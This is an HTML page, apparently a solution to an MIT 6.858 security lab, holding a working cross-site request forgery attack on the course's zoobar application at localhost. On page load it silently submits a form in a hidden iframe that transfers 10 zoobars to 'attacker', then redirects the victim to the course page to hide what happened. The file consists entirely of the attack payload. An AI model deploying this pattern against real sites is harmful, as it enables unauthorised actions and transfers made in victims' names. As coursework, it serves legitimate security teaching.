<!DOCTYPE html>
<html>
  <body>
    <!-- Based on https://stackoverflow.com/questions/17940811/example-of-silently-submitting-a-post-form-csrf -->
    <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="csrf-frame">
      <input name="zoobars" type="text" value="10">
      <input name=recipient type=text value="attacker">
    </form>
    <iframe style="display:none" name="csrf-frame"></iframe>
    <script>
      document.getElementsByName('csrf-frame')[0].onload = function() {
        window.location.href = 'http://css.csail.mit.edu/6.858/2014/'
      }
      document.forms[0].submit()
    </script>
  </body>
</html>
